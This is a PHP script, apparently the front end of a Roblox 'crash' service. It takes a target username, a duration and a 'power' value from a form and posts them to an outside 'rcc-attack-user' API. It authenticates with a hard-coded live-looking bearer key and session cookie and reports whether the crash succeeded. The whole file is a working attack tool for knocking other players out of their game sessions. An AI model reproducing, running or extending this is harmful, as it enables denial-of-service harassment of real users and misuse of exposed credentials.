<?php

if ($_SERVER["REQUEST_METHOD"] == "POST") {
     $duration = htmlspecialchars($_POST["duration"]);
     $power = htmlspecialchars($_POST["power"]);
    $name = htmlspecialchars($_POST["name"]);


$curl = curl_init();

$headers = [
    'Accept: */*',
    'Accept-Language: en-US,en;q=0.9',
    'Authorization: Bearer pk_live_cQn2XYLsfFsOU2mjZ1zuWRxodnVXTf9z',
    'Connection: keep-alive',
    'Content-Type: application/json',
    'Origin: http://center1.k745i7344j74885ljyr647k5.xyz',
    'Referer: http://center1.k745i7344j74885ljyr647k5.xyz/dashboard.php',
    'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36',
    'X-Api-Endpoint: rcc-attack-user',
];

$options = [
    CURLOPT_URL => 'http://center1.k745i7344j74885ljyr647k5.xyz/api.php',
    CURLOPT_RETURNTRANSFER => true,
    CURLOPT_FOLLOWLOCATION => true,
    CURLOPT_SSL_VERIFYPEER => false,
    CURLOPT_SSL_VERIFYHOST => false,
    CURLOPT_TIMEOUT => 30,
    CURLOPT_USERAGENT => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
    CURLOPT_POSTFIELDS => '{"duration":'.$duration.',"power":'.$power.',"user":"'.$name.'","cookie":""}',
    CURLOPT_CUSTOMREQUEST => 'POST',
    CURLOPT_HTTPHEADER => $headers,
    CURLOPT_COOKIE => 'PHPSESSID=d5p3kalsfdrj9uc8a82ak2i4qh; parallax_api_key=pk_live_cQn2XYLsfFsOU2mjZ1zuWRxodnVXTf9z; parallax_api_key_expires=1765994160',
];

curl_setopt_array($curl, $options);

 $response = curl_exec($curl);
     $httpCode = curl_getinfo($curl, CURLINFO_HTTP_CODE);
$error = curl_error($curl);

curl_close($curl);

if (strpos($httpCode, "200") !== false) {
    echo "<h3>Crash successfully</h3>";
    echo "<p><strong>Name:</strong> $response</p>";
}

elseif (strpos($response, "User is not in a game") !== false)
 {
   echo "<h3>Crash Failed -> User is not in a game.</h3>";
 }

 elseif (strpos($response, "Could not resolve server: Full Server") !== false)
 {
   echo "<h3>Crash Failed -> Could not resolve server: Full Server</h3>";
 }
  elseif (strpos($response, "Invalid username") !== false)
 {
   echo "<h3>Crash Failed -> Invalid Roblox Username </h3>";
 }
else{
    echo "<h3>Crash Failed $response</h3>";

}

}
?>
